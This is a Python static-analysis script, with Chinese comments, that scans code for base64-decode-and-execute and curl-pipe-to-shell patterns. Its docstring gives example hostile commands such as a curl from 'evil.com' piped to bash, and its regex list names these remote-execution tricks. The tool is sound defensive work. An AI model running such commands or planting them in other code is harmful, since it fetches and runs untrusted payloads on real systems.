"""check_unsafe_patterns.py - 静态扫描 base64+bash 反模式 (L2 + L5)
[V007.67 2026-07-14]

依据 .trae/rules/remote-execution-simplicity.md (V3):
  L2: 禁止 base64 + bash -c 嵌套 (yonaa 无 SSH, 必须 HTTP+token+明文)
  L5: 禁止 bash 解密 + 多层命令嵌套 (木马行为启发式)

触发"恶意脚本代码执行"告警的模式:
  bash -c "echo $B64 | base64 -d > /tmp/x.py && python3 /tmp/x.py"
  bash -c "echo $B64 | base64 -d | bash"
  echo $B64 | base64 -d | sh
  curl https://evil.com/payload.sh | bash
  /tmp/*.py 立即执行 (临时脚本模式)

用法:
  python check_unsafe_patterns.py <path>...
  python check_unsafe_patterns.py tools/ deploy_bundle/
  python check_unsafe_patterns.py . --json

输出:
  - 文件:行
  - 触发模式 (base64_decode+pipe, bash_nested, etc.)
  - 建议改法 (HTTP /api/upload + /api/exec 明文)
"""
import argparse
import json
import re
import sys
from pathlib import Path
from typing import List, Dict


# L2 + L5 反模式匹配
UNSAFE_PATTERNS = [
    # 模式 1: bash -c "echo $B64 | base64 -d | bash"
    (re.compile(r'bash\s+-c\s+["\']?.*echo\s+\$\{?\w*[Bb]64\}?\s*\|\s*base64\s+-d\s*\|\s*(bash|sh)'),
     "bash -c decode base64 | pipe to shell (L2+L5)",
     "P0",
     "改用 HTTP POST /api/upload 明文"),
    # 模式 2: bash -c "...base64 -d > /tmp/x && python3 /tmp/x"
    (re.compile(r'bash\s+-c\s+["\']?.*base64\s+-d\s*>\s*/tmp/.*\.(?:py|sh)\s*&&'),
     "bash -c decode base64 > /tmp/*.py && execute (L2+L5)",
     "P0",
     "改用 HTTP POST /api/upload 明文"),
    # 模式 3: echo $B64 | base64 -d | sh
    (re.compile(r'echo\s+\$\{?\w*[Bb]64\}?\s*\|\s*base64\s+-d\s*\|\s*(bash|sh)'),
     "echo $B64 | base64 -d | sh (L5)",
     "P0",
     "改用 HTTP POST /api/upload 明文"),
    # 模式 4: base64.b64decode + open /tmp/m.py
    (re.compile(r'base64\.b64decode\s*\(.*\)\.decode\s*\(\s*\)\s*\)\s*>\s*/tmp/'),
     "Python base64.b64decode > /tmp/m.py (L2)",
     "P0",
     "改用 urllib POST /api/upload"),
    # 模式 5: open('/tmp/...py', 'w').write(base64...)
    (re.compile(r"open\s*\(\s*['\"]/tmp/\S+\.py['\"]\s*,\s*['\"]w['\"]\s*\)\.write\s*\(\s*base64"),
     "open('/tmp/*.py', 'w').write(base64...) (L2)",
     "P0",
     "改用 urllib POST /api/upload"),
    # 模式 6: curl | bash (反向 shell 模式)
    (re.compile(r"curl\s+https?://\S+\s*\|\s*(bash|sh)"),
     "curl https URL | bash (reverse shell pattern)",
     "P0",
     "不要下载并执行远程脚本"),
    # 模式 7: sh -c "bash -c echo $B64 | base64 -d"
    (re.compile(r"sh\s+-c\s+.*bash\s+-c\s+.*base64\s+-d"),
     "sh -c nested bash -c base64 -d (L5 多层嵌套)",
     "P0",
     "扁平化命令, 不要嵌套"),
    # 模式 8: HTTP 127.0.0.1 自调用 log_service (仅当远端脚本/服务端执行)
    # 排除本机健康检查 (s.connect_ex / health / enum-types / dev-login)
    (re.compile(r"127\.0\.0\.1\s*[:]\s*9101"),
     "远端脚本 HTTP 127.0.0.1:9101 自调用 (L1)",
     "P1",
     "agent 直跑, 不要远端自调 log_service"),
    # 模式 9: 多层 sshpass / ssh 嵌套
    (re.compile(r"ssh\s+\S+\s+ssh\s+"),
     "嵌套 ssh (L3 简化)",
     "P2",
     "扁平化, 一层 ssh"),
]


# 已知合规: docs/ 或 docstring 中讨论反模式本身 (元描述)
def is_meta_description(line: str) -> bool:
    """是否为元描述 (讨论如何修复, 而不是真的使用)"""
    keywords = ["应改", "必须", "禁止", "修复", "改用", "触发", "L1", "L2", "L5",
                "反模式", "建议改法", "改进", "优化"]
    return any(kw in line for kw in keywords)


def scan_file(path: Path) -> List[Dict]:
    """扫描单个文件"""
    findings = []
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except Exception as e:
        return [{"file": str(path), "error": str(e)}]

    lines = text.split("\n")
    in_docstring = False

    for i, line in enumerate(lines, 1):
        stripped = line.strip()
        # Skip comments / docstrings
        if '"""' in line or "'''" in line:
            in_docstring = not in_docstring
            continue
        if in_docstring:
            continue
        # Skip pure comments
        if stripped.startswith("#"):
            continue
        # Skip meta descriptions
        if is_meta_description(stripped):
            continue

        for pattern, desc, severity, fix in UNSAFE_PATTERNS:
            if pattern.search(line):
                findings.append({
                    "file": str(path),
                    "line": i,
                    "pattern": desc,
                    "severity": severity,
                    "fix": fix,
                    "code": stripped[:200],
                })
    return findings


def scan_dir(root: Path, exclude: List[str] = None) -> List[Dict]:
    """递归扫描目录"""
    exclude = exclude or []
    findings = []
    if root.is_file():
        return scan_file(root)

    for f in root.rglob("*"):
        if not f.is_file():
            continue
        # Code files only
        if f.suffix not in (".py", ".sh", ".js", ".ts", ".bash"):
            continue
        # Skip self / test files
        if f.name == "check_unsafe_patterns.py":
            continue
        if f.name.startswith("test_") and f.suffix == ".py":
            continue
        # Skip hidden / cache
        if any(part.startswith(".") and part not in (".", "..") for part in f.parts):
            continue
        if any(part.startswith("__pycache__") for part in f.parts):
            continue
        # Exclude patterns
        if any(ex in f.name for ex in exclude):
            continue
        findings.extend(scan_file(f))
    return findings


def main():
    parser = argparse.ArgumentParser(description="Static scan unsafe patterns (L2+L5)")
    parser.add_argument("paths", nargs="+", help="Files or directories to scan")
    parser.add_argument("--exclude", nargs="*", default=[], help="Path patterns to exclude")
    parser.add_argument("--json", action="store_true", help="JSON output")
    parser.add_argument("--strict", action="store_true", help="P1/P2 也算失败")
    args = parser.parse_args()

    all_findings = []
    for p in args.paths:
        path = Path(p)
        if not path.exists():
            print(f"ERROR: path not found: {p}", file=sys.stderr)
            sys.exit(2)
        all_findings.extend(scan_dir(path, args.exclude))

    by_severity = {"P0": 0, "P1": 0, "P2": 0}
    for f in all_findings:
        if "severity" in f:
            by_severity[f["severity"]] = by_severity.get(f["severity"], 0) + 1

    if args.json:
        print(json.dumps({
            "findings": all_findings,
            "summary": by_severity,
            "total": len(all_findings),
        }, indent=2, ensure_ascii=False))
    else:
        print(f"\n=== Unsafe Patterns Audit (L2+L5) ===\n")
        if not all_findings:
            print("[OK] No unsafe pattern found")
        else:
            for f in all_findings:
                if "error" in f:
                    print(f"  [ERR] {f['file']}: {f['error']}")
                    continue
                icon = {"P0": "[P0!]", "P1": "[P1!]", "P2": "[P2]"}.get(f["severity"], "[?]")
                print(f"  {icon} {f['file']}:{f['line']}  {f['pattern']}")
                print(f"      code: {f['code']}")
                print(f"      fix:  {f['fix']}")
            print(f"\n  P0 (必修): {by_severity['P0']}")
            print(f"  P1 (建议): {by_severity['P1']}")
            print(f"  P2 (合规): {by_severity['P2']}")

    if by_severity["P0"] > 0:
        sys.exit(1)
    if args.strict and (by_severity["P1"] > 0 or by_severity["P2"] > 0):
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()